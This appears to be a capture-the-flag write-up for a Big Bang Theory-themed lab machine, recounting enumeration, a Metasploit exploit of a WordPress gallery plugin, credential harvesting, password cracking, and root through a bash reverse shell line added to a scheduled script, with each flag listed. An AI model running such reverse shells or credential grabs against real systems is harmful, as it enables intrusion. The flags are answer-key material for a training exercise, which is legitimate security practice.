one flag obtained 

FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}

The things we observe are ftp, ssh and web .

Start with web 

The web page has pic of Penny and Shelly 

With a message , get all 7 flags and root to win 

Dirbuster to the attack 

gives us quite a few directories 

One is robots.txt

Disallow: /howard
Disallow: /web_shell.php
Disallow: /backdoor
Disallow: /rootflag.txt

Nothing worked except getting a gif of Penny 

Sneeky howards

Nothing on the web front .

Lets try ftp 

The ftp is set up by Sheldon

Greetings my dear friends
This is Sheldon Cooper speaking
I am really happy to announce that I have installed our brand new FTP server.
I have created a folder for each one of you so that you can store anything you want as you have asked me to do.
Soon I will be posting here useful information about the roomate agreement and the updated FTP agreement.
Also I will add a few jokes about trains, comic books and Star Wars.
PS: Please dont store important files here as this is set to be anonymous and public accessed.

-Dr. Sheldon Cooper



DONT STORE IMPORTANT FILES
DONT UPLOAD PORN AGAIN HOWARD, I WILL DELETE IT!!!
DONT UPLOAD MORE THAN 5GB OF DATA

From penny
SHELDON DONT CHANGHE IT AGAIN OK!?!?!

wifipassword: pennyisafreeloader


Moving back to the web 


there is a wordpress site 

/music/wordpress

Here we can see the wordpress is running reflex gallery and it has a exploit 

Exploiting it using metasploit 

We get a reverse shell

in wp-config

DB_NAME footprintsonthemoon
DB_USER footprintsonthemoon
DB_PASSWORD 	footprintsonthemoon1337

private 

bigpharmacorp
weareevil


So take a look into the user accounts 

Amy 

This is my secret diary.
The safest way to keep my secrets is inside a compiled executable program.
As soon as I get popular now, that I have friends, I will start adding my secrets here.
I have used a really strong password that it cant be bruteforced.
Seriously it is 18 digit, alphanumeric, uppercase/lowercase with symbols.
And since my program is already compiled, no one can read the source code in order to view the password!

Roughaging through penny's user account , could get FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}

3 flags done ...

4 left


We try the phpmyadmin

with credentials

and got berni's flag 
bernadette{f42d950ab0e966198b66a5c719832d5f}


So we take the zip

do a zip2john to get astronaut 
and have given to stegcracker which has found iloveyoumom

FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}


On reinspecting the sql , 

the flag was found in wp-posts , a little cheating 

FLAG-raz{40d17a74e28a62eac2df19e206f0987c}


We moved to leonard's section 

there was a script to run after every few times 

We added a reverse shell like 

bash -i >& /dev/tcp/192.168.1.4/9885 0>&1

we got the root 

                         ____
                        /    \
                       /______\
                          ||
           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\
          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\
         (_)========(_)   ||  (_)==== ===========(_)
          I|_________|I  _||_  |___________________|
.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Gongrats!
You have rooted the box! Now you can sit on Sheldons spot!
FLAG-leonard{17fc95224b65286941c54747704acd3e}


Thats all 7 seven flags ....

BAZINGAAA !!!!!
